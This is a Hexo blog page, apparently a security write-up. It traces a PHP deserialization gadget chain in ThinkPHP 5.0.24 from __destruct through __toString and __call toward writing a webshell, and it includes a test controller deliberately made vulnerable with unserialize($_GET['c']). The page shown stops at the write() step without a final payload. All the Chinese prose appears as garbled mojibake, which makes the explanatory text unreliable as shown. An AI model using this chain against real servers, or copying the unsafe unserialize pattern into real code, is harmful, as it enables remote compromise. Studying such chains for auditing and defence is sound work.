<!DOCTYPE html>
<html lang="zh-CN">

<head>

  <!-- Minima -->
  <!-- Hexo theme created by @adisaktijrs -->

  <!-- Basic Page Needs
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta charset="utf-8">

  
  <title>thinkphp5.0ååºåˆ—åŒ–</title>
  
  <link rel="canonical" href="https://r0sew1thh3r.github.io/2022/09/20/thinkphp5.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
  
  <meta name="description" content="ç¯å¢ƒæ­å»ºthinkphpå®‰è£…: composer create-project topthink/think=5.0.* thinkphp5.0 --prefer-dist  åœ¨application/index/controller/Index.phpæ·»åŠ æ¼æ´æµ‹è¯•ä»£ç ï¼š &amp;lt;?php name">
  
  
  <meta name="author" content="R0seW1thH3r">
  
  
  
  <meta property="og:site_name" content="R0seW1thH3r" />
  <meta property="og:type" content="article" />
  <meta property="og:title" content="thinkphp5.0ååºåˆ—åŒ–" />
  
  <meta property="og:description" content="ç¯å¢ƒæ­å»ºthinkphpå®‰è£…: composer create-project topthink/think=5.0.* thinkphp5.0 --prefer-dist  åœ¨application/index/controller/Index.phpæ·»åŠ æ¼æ´æµ‹è¯•ä»£ç ï¼š &amp;lt;?php name">
  
  <meta property="og:url" content="https://r0sew1thh3r.github.io/2022/09/20/thinkphp5.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="thinkphp5.0ååºåˆ—åŒ–">
  
  <meta name="twitter:description" content="ç¯å¢ƒæ­å»ºthinkphpå®‰è£…: composer create-project topthink/think=5.0.* thinkphp5.0 --prefer-dist  åœ¨application/index/controller/Index.phpæ·»åŠ æ¼æ´æµ‹è¯•ä»£ç ï¼š &amp;lt;?php name">
  
  
  
  
  <meta name="twitter:url" content="https://r0sew1thh3r.github.io/2022/09/20/thinkphp5.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />

  <!-- Mobile Specific Metas
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Preload fonts
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>

  <!-- CSS
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  
<link rel="stylesheet" href="/css/normalize.css">

  
<link rel="stylesheet" href="/css/skeleton.css">

  
<link rel="stylesheet" href="/css/custom.css">

  
<link rel="stylesheet" href="/css/prism-dark.css">

  
<link rel="stylesheet" href="/css/prism-line-numbers.css">

  <!-- User css -->
  
  
<link rel="stylesheet" href="/css/user.css">

  

  <!-- Favicon
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="icon" type="image/png" href="/images/favicon.png">

  <!-- Custom Theme Color Style
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <style>
  a:not(.icon) {
    text-decoration-color: #0FA0CE;
    background-image: linear-gradient(
      to bottom,
      rgba(0, 0, 0, 0) 50%,
      #0FA0CE 50%
    );
  }
  blockquote {
    border-left: 8px solid #0FA0CE;
  }
  .nanobar .bar {
    background: #0FA0CE;
  }
  .button.button-primary:hover,
  button.button-primary:hover,
  input[type="submit"].button-primary:hover,
  input[type="reset"].button-primary:hover,
  input[type="button"].button-primary:hover,
  .button.button-primary:focus,
  button.button-primary:focus,
  input[type="submit"].button-primary:focus,
  input[type="reset"].button-primary:focus,
  input[type="button"].button-primary:focus {
    background-color: #0FA0CE;
    border-color: #0FA0CE;
  }
  input[type="email"]:focus,
  input[type="number"]:focus,
  input[type="search"]:focus,
  input[type="text"]:focus,
  input[type="tel"]:focus,
  input[type="url"]:focus,
  input[type="password"]:focus,
  textarea:focus,
  select:focus {
    border: 1px solid #0FA0CE;
  }
</style>

  <!-- Google Analytics (With Privacy Settings On)
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  

  
  <script src="/js/pic.min.js" defer></script>
  

  

<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div class="container">
    <div class="row">
      <div>

        <div class="row">
  <div class="two columns" style="max-width: 50px">
    <h1 class="mt-2 mode">
      <div onclick=setDarkMode(true) id="darkBtn">ğŸŒ‘</div>
      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>â˜€ï¸</div>
      <script >
        if (localStorage.getItem('preferredTheme') == 'dark') {
          setDarkMode(true)
        }
        function setDarkMode(isDark) {
          var darkBtn = document.getElementById('darkBtn')
          var lightBtn = document.getElementById('lightBtn')
          if (isDark) {
            lightBtn.style.display = "block"
            darkBtn.style.display = "none"
            localStorage.setItem('preferredTheme', 'dark');
          } else {
            lightBtn.style.display = "none"
            darkBtn.style.display = "block"
            localStorage.removeItem('preferredTheme');
          }
          document.body.classList.toggle("darkmode");
        }
      </script>
    </h1>
  </div>

  <div class="six columns ml-1">
    <h1 class="mt-2">
      Hi Folks.
    </h1>
  </div>

  <div class="twelve columns">
    <div class="row">
      <div class="nine columns left">
        <a href="/">Home</a>
        
          
          <a href="/tags" class="ml">Tags</a>
          
        
          
          <a href="/about" class="ml">About</a>
          
        
        
      </div>
    </div>
    <hr style="margin-bottom: 2.6rem">
  </div>
</div>
<link rel="stylesheet" href="/js/prism/prism.css">
        <div class="trans">
            <h2>thinkphp5.0ååºåˆ—åŒ–</h2>

  <h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>thinkphpå®‰è£…:</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">composer</span> create-project topthink/think<span class="token operator">=</span><span class="token number">5.0</span>.* thinkphp5.0 --prefer-dist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åœ¨<code>application/index/controller/Index.php</code>æ·»åŠ æ¼æ´æµ‹è¯•ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Welcome to thinkphp5.0.24'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> 
<span class="token operator">**</span>tp5<span class="token operator">.</span><span class="token number">0</span>çš„è®¿é—®æ–¹å¼<span class="token operator">**</span>ï¼š</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">å…¥å£æ–‡ä»¶:	http:&#x2F;&#x2F;127.0.0.1&#x2F;code_audit&#x2F;thinkphp5.0&#x2F;public&#x2F;
urlè®¿é—®:		http:&#x2F;&#x2F;127.0.0.1&#x2F;code_audit&#x2F;thinkphp5.0&#x2F;public&#x2F;?s&#x3D;&#x2F;index&#x2F;index&#x2F;test&#x2F;
ä¼ å‚:		http:&#x2F;&#x2F;127.0.0.1&#x2F;code_audit&#x2F;thinkphp5.0&#x2F;public&#x2F;?s&#x3D;&#x2F;index&#x2F;index&#x2F;test&#x2F;&amp;c&#x3D;1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h1 id="é“¾å­"><a href="#é“¾å­" class="headerlink" title="é“¾å­"></a>é“¾å­</h1><h2 id="èµ·ç‚¹destruct"><a href="#èµ·ç‚¹destruct" class="headerlink" title="èµ·ç‚¹destruct"></a>èµ·ç‚¹destruct</h2><p>ç›´æ¥<code>Ctrl+Shift+F</code>æœç´¢<code>__destruct(</code><br><img src="https://img-blog.csdnimg.cn/3c0fc26fc6cd4f6d8cfe489a6476d791.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¿™é‡Œè·Ÿçš„æ˜¯Windowsç±»ã€‚</p>
<p>å‘ç°å®ƒè°ƒç”¨äº†<code>removeFiles()</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/37c62768c98241f08da4d06a7abc4264.png" alt="tp5.01.png"></p>
<p>å‘ç°removeFiles()å‡½æ•°ä½¿ç”¨äº† file_exists æ–¹æ³•ã€‚å¹¶ä¸”file_exists æ–¹æ³•çš„å‚æ•°$filenameçš„å€¼æˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡åºåˆ—åŒ–æé€ çš„ï¼Œä¹Ÿå°±æ˜¯å¯æ§çš„ã€‚</p>
<p>æˆ‘ä»¬çœ‹çœ‹file_existsæ˜¯ä¸ªå•¥å‡½æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/6e6e4600a5c54d90a5a2b411893b996d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹ file_exists çš„å®šä¹‰å¯ä»¥çŸ¥é“ï¼Œ$filenameä¼šè¢«å½“åšå­—ç¬¦ä¸²å¤„ç†ï¼Œé‚£ä¹ˆ$filename-&gt;__toString()æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ã€‚</p>
<h2 id="è·³æ¿tostring"><a href="#è·³æ¿tostring" class="headerlink" title="è·³æ¿tostring"></a>è·³æ¿tostring</h2><p>ä¸‹é¢å°±è¦å¯»æ‰¾ä¸€ä¸ªå®ç°äº†__toString()æ–¹æ³•çš„å¯¹è±¡æ¥ä½œä¸ºè·³æ¿ã€‚<br><img src="https://img-blog.csdnimg.cn/ce96344c7bdd44cfac05b474397d4555.png"><br>æ­¤å¤„think\Model.phpå­˜åœ¨è·³æ¿å¯èƒ½ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½¿ç”¨äº†$this-&gt;toJson()æ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">toJson</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">JSON_UNESCAPED_UNICODE</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½¿ç”¨äº†$this-&gt;toArray()æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/d487e5c522e94ecdb626111b7593a64f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬912è¡Œï¼Œ$valueè°ƒç”¨äº†ä¸€ä¸ªgetAttr()æ–¹æ³•ï¼Œå¦‚æœ$valueå¯æ§çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥<strong>é€šè¿‡æ§åˆ¶$valueçš„å€¼è°ƒç”¨__call()æ–¹æ³•</strong>ã€‚</p>
<p>æˆ‘ä»¬å¾€ä¸Šè·Ÿè¿›ï¼Œçœ‹çœ‹$valueæ˜¯å¦å¯æ§ã€‚<br><img src="https://img-blog.csdnimg.cn/0fe5465d57fe4a5897cab3270e7743f4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å‘ç°ç¬¬902è¡Œ$valueæ˜¯ç”±getRelationData()çš„è¿”å›å€¼è¿›è¡Œèµ‹å€¼çš„ï¼Œæˆ‘ä»¬è·Ÿå…¥getRelationData()å‡½æ•°ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/d2a6562178e9410eb53eaf4ba23dd7d6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬å‘ç° getRelationData() å‡½æ•°ä¸­ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„<em>å‚æ•°ä¸º Relation ç±»</em>ï¼ˆ<strong>æ–¹æ³•å‚æ•°ç±»å‹çº¦æŸ</strong>ï¼Œå‡½æ•°å‚æ•°ç±»å‹å†™äº†Relationï¼‰ä¸”<em>æ»¡è¶³ if åˆ†æ”¯çš„æ¡ä»¶</em>ï¼Œé‚£ä¹ˆ <u>$valueå°±ä¼šç”±$this-&gt;parent çš„å€¼å†³å®š</u>ï¼Œè€Œä¸”$this-&gt;parent çš„å€¼æ˜¯å¯æ§çš„ã€‚</p>
<p>1ã€<em>åˆ¤æ–­æ˜¯å¦èƒ½ä¼ å…¥ä¸€ä¸ªæ˜¯Relationç±»çš„å¯¹è±¡çš„å‚æ•°ã€‚</em></p>
<p>æˆ‘ä»¬å›åˆ°\think\Modelï¼Œå‘ç°è°ƒç”¨getRelationData()å‡½æ•°æ—¶ä¼ å…¥çš„æ˜¯$modelRelationå˜é‡ã€‚ä¹Ÿå°±æ˜¯è¦è®©$modelRelationå˜é‡å€¼æ˜¯Ralationç±»çš„å¯¹è±¡ã€‚<br><img src="https://img-blog.csdnimg.cn/269ba5d4800044d4b2ce91a8f6bb0a80.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç»§ç»­è·Ÿè¿›ï¼Œ$modelRelationå˜é‡æ˜¯ç”±$relation()çš„è¿”å›å€¼å†³å®šçš„ã€‚ä¹Ÿå°±æ˜¯è¦<strong>è®©$relation()çš„è¿”å›å€¼æ˜¯Ralationç±»çš„å¯¹è±¡</strong>ã€‚</p>
<p>è·Ÿè¿›$relation()ï¼Œå‘ç°$relation()å‡½æ•°æ˜¯æ ¹æ®$relationçš„å€¼è¿›è¡Œè°ƒç”¨çš„ï¼Œ$relationçš„å€¼æ˜¯ç”±<code>Loader::parseName($name, 1, false)</code>çš„è¿”å›å€¼å†³å®šçš„ï¼Œå¯ä»¥åœ¨Loader.phpé‡Œæ‰¾åˆ°parseName()å‡½æ•°ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/9ed2116f3e054d75aec62c3e185bf63e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>parseName()å‡½æ•°åªå¯¹ä¼ è¿›æ¥çš„$nameå‚æ•°åšäº†ä¸€äº›å¤§å°å†™æ›¿æ¢ï¼Œæ²¡æœ‰å®è´¨ä¸Šçš„è¿‡æ»¤æ“ä½œã€‚<br>å¦‚æœ$nameæ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆLoader::parseName($name, 1, false)çš„è¿”å›å€¼å°±å¯æ§ï¼Œé‚£ä¹ˆ$relationçš„å€¼å°±å¯æ§ã€‚</p>
<p>å¾€ä¸Šè·Ÿè¸ªçœ‹çœ‹$nameæ˜¯æ€ä¹ˆæ¥çš„ï¼Œæ˜¯ä¸æ˜¯å¯æ§ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/139ef683af9c45ce881485a77904c5d4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å¦‚ä¸Šå›¾ï¼Œé¦–å…ˆåˆ¤æ–­$this-&gt;appendæ˜¯ä¸æ˜¯ç©ºï¼Œä¸æ˜¯çš„è¯è¿›å…¥ä¸‹é¢ã€‚<code>foreach ($this-&gt;append as $key =&gt; $name)</code>æŠŠ</p>
<p>appendçš„å€¼èµ‹ç»™äº†$nameã€‚è€Œ$this-&gt;appendæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯$nameå¯æ§ã€‚</p>
<p>æˆ‘ä»¬æ§åˆ¶nameçš„å€¼è¿›å…¥æœ€åä¸€ä¸ªifè¯­å¥elseã€‚è¿›å…¥ä¹‹åï¼Œ$relationçš„å€¼æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶äº†ã€‚</p>
<p>æ¥ç€çœ‹ä¸‹é¢ï¼Œ<code>if (method_exists($this, $relation))</code> ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ$relationçš„å€¼è¦æ˜¯æ­¤ç±»çš„æŸä¸€ä¸ªæ–¹æ³•åã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©getError()æ–¹æ³•ã€‚<br><img src="https://img-blog.csdnimg.cn/ec1244b3cbda498794d70b2cbbcdce51.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å› ä¸ºgetError()æ–¹æ³•ä¼šç›´æ¥è¿”å›$this-&gt;errorï¼Œå¹¶ä¸”$this-&gt;errorå¯æ§ã€‚<br>é‚£ä¹ˆ$relationçš„å€¼è¦ä¸ºgetErrorã€‚</p>
<p>$modelRelationå˜é‡å€¼æ˜¯$relation()çš„è¿”å›å€¼ï¼Œä¹Ÿå°±æ˜¯getError()æ–¹æ³•çš„è¿”å›å€¼ï¼Œä¹Ÿå°±æ˜¯$this-&gt;errorçš„å€¼ã€‚</p>
<p>è¦è®©$modelRelationå˜é‡å€¼æ˜¯Ralationç±»çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å°±è¦æ§åˆ¶$this-&gt;errorçš„å€¼æ˜¯Ralationç±»çš„å¯¹è±¡ã€‚</p>
<p><u>ç»¼ä¸Šæ˜¯å¯ä»¥ç»™getRelationData() å‡½æ•°ä¼ å…¥ä¸€ä¸ªRelationç±»çš„å¯¹è±¡å‚æ•°çš„ã€‚</u></p>
<p>2ã€<em>çœ‹æ»¡ä¸æ»¡è¶³ifåˆ†æ”¯çš„æ¡ä»¶ã€‚</em><br><img src="https://img-blog.csdnimg.cn/3fbf4cc8d4974993b34893e6b1505e28.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>$this-&gt;parent çš„å€¼å¯æ§ï¼Œifåˆ†æ”¯çš„ç¬¬ä¸€ä¸ªæ¡ä»¶å¯ä»¥æ»¡è¶³ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ç¬¬äºŒä¸ªæ¡ä»¶ï¼Œè·Ÿè¿› isSelfRelation() å‡½æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/787d1e12a0dc4cdf9730507a9fda001a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç›´æ¥è¿”å›$this-&gt;selfRelationï¼Œå¯æ§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ»¡è¶³ifçš„ç¬¬äºŒä¸ªæ¡ä»¶ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ç¬¬ä¸‰ä¸ªæ¡ä»¶ï¼Œç»§ç»­è·Ÿè¿›getModel()å‡½æ•°ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/592ba43e6e9948db89745100e92dcf38.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¿”å›$this-&gt;query-&gt;getModel()ï¼Œ$queryå¯æ§ã€‚å› æ­¤æ­¤æ—¶æˆ‘ä»¬éœ€è¦æŸ¥æ‰¾å“ªä¸ªç±»çš„getModel()çš„è¿”å›å€¼æ˜¯å¯æ§çš„ï¼Œåœ¨è¿™é‡Œæ‰¾åˆ°äº†\think\db\Queryç±»ï¼Œè·Ÿè¿›\think\db\Queryç±»</p>
<p><img src="https://img-blog.csdnimg.cn/93002e6133fa42e688cd8e61853bc23c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>\think\db\Queryç±»çš„getModel()æ–¹æ³•è¿”å›$this-&gt;modelï¼Œå¯æ§ã€‚<br>å› æ­¤ç¬¬ä¸‰ä¸ªæ¡ä»¶æ»¡è¶³ï¼Œifåˆ†æ”¯æ»¡è¶³ã€‚</p>
<p><u>ç»¼ä¸Šæ»¡è¶³ifåˆ†æ”¯çš„æ¡ä»¶ã€‚</u></p>
<p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡æ§åˆ¶$this-&gt;parent çš„å€¼å»æ§åˆ¶$valueçš„å€¼ã€‚</p>
<p>å¾€ä¸‹çœ‹ï¼Œè™½ç„¶$valueå¯æ§ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜è¦æ»¡è¶³ä¸¤ä¸ªifçš„æ¡ä»¶æ‰èƒ½è°ƒç”¨__call()æ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›è¿™ä¸¤ä¸ªifæ¡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/1fc01694bfa34d77b40362ea7e058dbf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç¬¬ä¸€ä¸ªifæ¡ä»¶éœ€è¦æ»¡è¶³$modelRelationå­˜åœ¨getBindAttr()å‡½æ•°ï¼Œæˆ‘ä»¬å…¨å±€æœç´¢ä¸€ä¸‹getBindAttr()å‡½æ•°ï¼Œå‘ç°Relationç±»ä¸­ä¸å­˜åœ¨è¯¥æ–¹æ³•ï¼Œä½†OneToOneç±»ä¸­å­˜åœ¨ï¼Œä¸”OneToOneç±»æ˜¯Relationç±»çš„å­ç±»ã€‚</p>
<p>OneToOneç±»çš„getBindAttr()å‡½æ•°ç›´æ¥è¿”å›äº†$this-&gt;bindAttrï¼Œä¸”$this-&gt;bindAttrå¯æ§ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/20c332ed949c44e3a595536b24530445.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è·Ÿè¿›OneToOne.phpï¼Œå‘ç°OneToOneæ˜¯ä¸ªæŠ½è±¡ç±»(abstract)ï¼Œæ— æ³•ç”Ÿæˆå®ä¾‹ã€‚</p>
<p>æˆ‘ä»¬å…¨å±€æœç´¢ç»§æ‰¿å®ƒçš„ç±»ï¼Œå‘ç°HasOneç±»(æˆ–è€…BelongsTo)ç»§æ‰¿äº†OneToOneç±»ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»¤$modelRelationçš„å€¼ä¸ºHasOneï¼Œæ­¤æ—¶ä¾¿å¯æ»¡è¶³ç¬¬ä¸€ä¸ªifæ¡ä»¶ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/2814f2a6a0cd40ed836fc566343ec666.png"></p>
<p>ç”±äº$this-&gt;bindAttrå¯æ§ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿèƒ½æ»¡è¶³ç¬¬äºŒä¸ªifæ¡ä»¶ã€‚</p>
<p>æˆ‘ä»¬å¾€ä¸‹è·Ÿè¿›ï¼Œå‘ç°$attrå˜é‡ç”±$bindAttrå†³å®šï¼Œä¸”$attrå˜é‡ç”¨äº912è¡Œçš„$value-&gt;getAttr()ä¸­ï¼Œå› æ­¤<code>$value-&gt;getAttr($attr)</code>å¯æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®$value-&gt;getAttr($attr)è°ƒç”¨__call()æ–¹æ³•ã€‚</p>
<h2 id="æœ€åcall"><a href="#æœ€åcall" class="headerlink" title="æœ€åcall"></a>æœ€åcall</h2><p>æ­¤æ—¶æˆ‘ä»¬éœ€è¦å¯»æ‰¾èƒ½å†™webshellçš„__call()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œé€‰æ‹©çš„æ˜¯think\console\Outputç±»<br><img src="https://img-blog.csdnimg.cn/e3a132ff7d8c4c91b9074fc4eeb51063.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ in_array æ–¹æ³•:</p>
<p><img src="https://img-blog.csdnimg.cn/0b01b51c7ae24faaa0b020fedcf4b9b3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><code>if(in_array($method,$this-&gt;styles))</code> é‡Œçš„$methodæ˜¯getAttrï¼Œä¸”$this-&gt;stylesæ˜¯å¯æ§çš„ã€‚åªè¦åœ¨stylesæ•°ç»„é‡ŒåŠ ä¸€ä¸ªgetAttrå³å¯ã€‚æ‰€ä»¥å¯ä»¥é¡ºåˆ©è¿›å…¥ç¬¬ä¸€ä¸ªifã€‚</p>
<p>array_unshift() å‡½æ•°ç”¨äºå‘æ•°ç»„æ’å…¥æ–°å…ƒç´ ï¼Œæ–°æ•°ç»„çš„å€¼å°†è¢«æ’å…¥åˆ°æ•°ç»„çš„å¼€å¤´ã€‚<code>array_unshift($args, $method)</code>é‡Œçš„å‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å¾€ä¸‹èµ°æ²¡æœ‰å½±å“ã€‚</p>
<p>call_user_func_array()æ˜¯å›è°ƒå‡½æ•°ï¼Œå¯ä»¥å°†æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ã€‚<code>call_user_func_array([$this, &#39;block&#39;], $args);</code> ä¹Ÿå°±æ˜¯è°ƒç”¨blockå‡½æ•°ï¼Œä¼ å‚æ˜¯$argsæ•°ç»„ã€‚</p>
<p>æˆ‘ä»¬è·Ÿä¸€ä¸‹blockå‡½æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/32c1de3adf654b2f8d5618a2ade3f911.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è·Ÿè¿›writelnå‡½æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/be4d79be92a94313a1accfb7395a27f2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è·Ÿè¿›writeå‡½æ•°ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/2acae2f7e46d45f8a5458d8672433c50.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
